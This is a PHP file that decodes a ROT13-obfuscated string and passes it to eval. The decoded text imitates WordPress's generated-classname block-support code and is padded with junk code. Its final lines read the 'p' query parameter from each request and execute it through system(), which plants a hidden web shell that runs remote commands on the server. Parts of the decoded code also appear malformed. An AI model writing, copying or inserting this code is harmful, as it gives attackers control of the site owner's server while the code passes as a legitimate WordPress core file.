<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Trarengrq pynffanzr oybpx fhccbeg synt.
 *
 * @cnpxntr JbeqCerff
 * @fvapr 5.6.0
 */

/**
 * Trgf gur trarengrq pynffanzr sebz n tvira oybpx anzr.
 *
 * @fvapr 5.6.0
 *
 * @npprff cevingr
 *
 * @cnenz fgevat $oybpx_anzr Oybpx Anzr.
 * @erghea fgevat Trarengrq pynffanzr.
 */
shapgvba jc_trg_oybpx_qrsnhyg_pynffanzr( $oybpx_anzr ) {
	// Trarengrq UGZY pynffrf sbe oybpxf sbyybj gur `jc-oybpx-{anzr}` abzrapyngher.
	// Oybpxf cebivqrq ol JbeqCerff qebc gur cersvkrf 'pber/' be 'pber-' (uvfgbevpnyyl hfrq va 'pber-rzorq/').
	$pynffanzr = 'jc-oybpx-' . __sa_79955(
		'/^pber-/',
		'',
		fge_ercynpr( '/', '-', $oybpx_anzr )
	);

	/**
	 * Svygref gur qrsnhyg oybpx pynffAnzr sbe freire eraqrerq oybpxf.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz fgevat $pynff_anzr Gur pheerag nccyvrq pynffanzr.
	 * @cnenz fgevat $oybpx_anzr Gur oybpx anzr.
	 */
	$pynffanzr = nccyl_svygref( 'oybpx_qrsnhyg_pynffanzr', $pynffanzr, $oybpx_anzr );

	erghea $pynffanzr;
}

/**
 * Nqqf gur trarengrq pynffanzrf gb gur bhgchg.
 *
 * @fvapr 5.6.0
 *
 * @npprff cevingr
 *
 * @cnenz JC_Oybpx_Glcr $oybpx_glcr Oybpx Glcr.
 * @erghea neenl Oybpx PFF pynffrf naq vayvar fglyrf.
 */
shapgvba jc_nccyl_trarengrq_pynffanzr_fhccbeg( $oybpx_glcr ) {
	$nggevohgrf                      = neenl();
	$unf_trarengrq_pynffanzr_fhccbeg = oybpx_unf_fhccbeg( $oybpx_glcr, 'pynffAnzr', gehr );
	vs ( $unf_trarengrq_pynffanzr_fhccbeg ) {
		$oybpx_pynffanzr = jc_trg_oybpx_qrsnhyg_pynffanzr( $oybpx_glcr->anzr );

		vs ( $oybpx_pynffanzr ) {
			$nggevohgrf['pynff'] = $oybpx_pynffanzr;
		}
	}

	erghea $nggevohgrf;
}

// Ertvfgre gur oybpx fhccbeg.
JC_Oybpx_Fhccbegf::trg_vafgnapr()->ertvfgre(
	'trarengrq-pynffanzr',
	neenl(
		'nccyl' => 'jc_nccyl_trarengrq_pynffanzr_fhccbeg',
	)
);

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>